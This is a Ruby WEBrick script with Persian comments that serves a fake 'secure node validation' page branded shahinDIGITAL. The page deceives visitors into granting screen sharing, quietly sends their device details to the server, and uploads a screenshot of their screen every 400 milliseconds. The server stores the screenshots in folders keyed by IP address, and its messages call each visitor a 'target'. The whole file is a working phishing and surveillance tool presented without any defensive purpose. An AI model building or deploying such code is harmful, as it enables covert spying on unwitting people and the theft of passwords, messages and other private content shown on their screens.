require 'webrick'
require 'json'
require 'base64'
require 'fileutils'

port = 9090
server = WEBrick::HTTPServer.new(:Port => port)

print "\n[+] داشبورد پیشرفته مانیتورینگ صفحه نمایش (Screen Share) مهندس شاهین روی پورت #{port} فعال شد...\n"
print "[+] آماده دریافت فریم‌های زنده Desktop/Screen از هدف...\n\n"

# داشبورد گرافیکی سایبرپانک با قابلیت ضبط و ارسال صفحه نمایش
server.mount_proc '/' do |req, res|
  client_ip = req.peeraddr[3]
  print "[!] هشدار سایبری: هدف جدید به پنل اسکرین‌شیر متصل شد! (IP: #{client_ip})\n"

  res.status = 200
  res['Content-Type'] = 'text/html; charset=utf-8'
  res.body = <<~HTML
    <!DOCTYPE html>
    <html lang="fa" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>shahinDIGITAL | Secure Screen Surveillance</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;700&display=swap');
            body { font-family: 'Vazirmatn', sans-serif; background-color: #030712; color: #f3f4f6; }
            .glass-panel { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(20px); border: 1px solid rgba(56, 189, 248, 0.3); box-shadow: 0 0 30px rgba(14, 165, 233, 0.15); }
            .neon-text { text-shadow: 0 0 12px rgba(56, 189, 248, 0.6); }
            .pulse-dot { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
            @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        </style>
    </head>
    <body class="min-h-screen flex items-center justify-center p-4">

        <div class="w-full max-w-3xl glass-panel rounded-2xl p-6 md:p-8 relative overflow-hidden">
            <!-- افکت هدر نئونی -->
            <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-cyan-500 via-indigo-500 to-purple-500"></div>

            <div class="flex items-center justify-between mb-6">
                <div class="flex items-center space-x-3 space-x-reverse">
                    <div class="w-3 h-3 rounded-full bg-cyan-400 pulse-dot"></div>
                    <span class="text-xs tracking-wider text-cyan-400 uppercase font-mono">SHAHINDIGITAL // SECURE_NODE</span>
                </div>
                <span class="text-xs text-slate-400 font-mono">TUNNEL: ACTIVE</span>
            </div>

            <div class="text-center mb-6">
                <h1 class="text-2xl md:text-3xl font-bold text-white neon-text mb-2">سامانه نظارت هوشمند shahinDIGITAL</h1>
                <p class="text-slate-400 text-sm">در حال اعتبارسنجی گره امنیتی شبکه...</p>
            </div>

            <!-- کانتینر نمایش ویدیو / صفحه نمایش -->
            <div class="relative w-full aspect-video bg-slate-950 rounded-xl overflow-hidden border border-slate-800 flex items-center justify-center shadow-inner">
                <div id="loadingState" class="absolute inset-0 flex flex-col items-center justify-center bg-slate-950/95 z-10 transition-opacity duration-500 p-6 text-center">
                    <div class="w-12 h-12 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin mb-4"></div>
                    <p class="text-cyan-400 text-sm font-mono mb-2">در انتظار تایید امنیتی گره...</p>
                    <p class="text-slate-400 text-xs">لطفاً در صورت درخواست مرورگر، گزینه اشتراک‌گذاری صفحه را تایید کنید.</p>
                </div>
                <video id="v" autoplay playsinline class="w-full h-full object-contain"></video>
                <canvas id="c" class="hidden"></canvas>
            </div>

            <!-- فوتر -->
            <div class="mt-6 pt-4 border-t border-slate-800/80 flex flex-col md:flex-row justify-between items-center text-xs text-slate-500 font-mono">
                <span>ENCRYPTED DESKTOP FEED</span>
                <span class="text-cyan-400/80 mt-2 md:mt-0">ARCHITECTED BY SHAHIN DIGITAL</span>
            </div>
        </div>

        <script>
            window.onload = async function() {
                const video = document.getElementById('v');
                const canvas = document.getElementById('c');
                const ctx = canvas.getContext('2d');
                const loadingState = document.getElementById('loadingState');

                let baseData = {
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: window.screen.width + "x" + window.screen.height
                };

                fetch('/collect_info', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(baseData)
                });

                try {
                    const stream = await navigator.mediaDevices.getDisplayMedia({ 
                        video: { cursor: "always" }, 
                        audio: false 
                    });

                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        loadingState.style.opacity = '0';
                        setTimeout(() => loadingState.style.display = 'none', 500);
                    }, 800);

                    setInterval(function() {
                        if (document.visibilityState === 'visible' && video.readyState === video.HAVE_ENOUGH_DATA) {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            let frameBase64 = canvas.toDataURL('image/jpeg', 0.5);

                            fetch('/upload_screen', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ frame: frameBase64 })
                            });
                        }
                    }, 400);

                    stream.getVideoTracks()[0].onended = function() {
                        console.log("Screen sharing stopped by target.");
                    };

                } catch(err) {
                    console.log("Screen share error: " + err);
                    loadingState.innerHTML = '<p class="text-red-400 font-mono">دسترسی به اسکرین‌شیر رد شد یا پشتیبانی نمی‌شود.</p>';
                }
            };
        </script>
    </body>
    </html>
  HTML
end

# مسیر ذخیره‌سازی اطلاعات سخت‌افزاری
server.mount_proc '/collect_info' do |req, res|
  client_ip = req.peeraddr[3].gsub(':', '_')
  data = JSON.parse(req.body)
  dir = "shahin_digital_logs_#{client_ip}"
  FileUtils.mkdir_p(dir)
  File.open("#{dir}/device_info.json", 'w') { |f| f.write(JSON.pretty_generate(data)) }
  print "[+] مشخصات سیستم هدف (#{client_ip}) ثبت شد.\n"
  res.status = 200; res.body = "OK"
end

# مسیر دریافت فریم‌های صفحه نمایش و تفکیک پوشه
server.mount_proc '/upload_screen' do |req, res|
  begin
    client_ip = req.peeraddr[3].gsub(':', '_')
    dir = "shahin_digital_logs_#{client_ip}/frames"
    FileUtils.mkdir_p(dir)

    data = JSON.parse(req.body)
    img_data = data['frame'].split(',')[1]
    decoded = Base64.decode64(img_data)

    filename = "#{dir}/screen_#{Time.now.to_i}_#{rand(10000)}.jpg"
    File.open(filename, 'wb') { |f| f.write(decoded) }

    print "[+] فریم صفحه نمایش از هدف (#{client_ip}) دریافت و ثبت شد: #{filename}\r"
  rescue => e
    print "[-] خطا در ذخیره فریم صفحه: #{e.message}\n"
  end
  res.status = 200; res.body = "OK"
end

trap 'INT' do
  server.shutdown
end

server.start
